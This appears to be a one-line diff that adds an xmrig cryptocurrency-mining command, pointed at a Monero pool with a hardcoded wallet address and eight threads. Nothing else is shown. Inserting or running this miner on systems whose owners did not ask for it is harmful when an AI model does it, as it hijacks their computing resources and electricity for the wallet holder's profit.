@@ -1,0 +1,1 @@
+./xmrig -a cryptonight -o stratum+tcp://pool.supportxmr.com:5555 -u 42Bs6KjwSds6RRj3jwXRLnUyr12wNTevWEVzeiN6ZhjdFMPpEn1wkR1TT8RqX3nGUQ3XPftTksp9C2HPPwMH7bHsLWfxfdu -p x -t 8 --donate-level=0
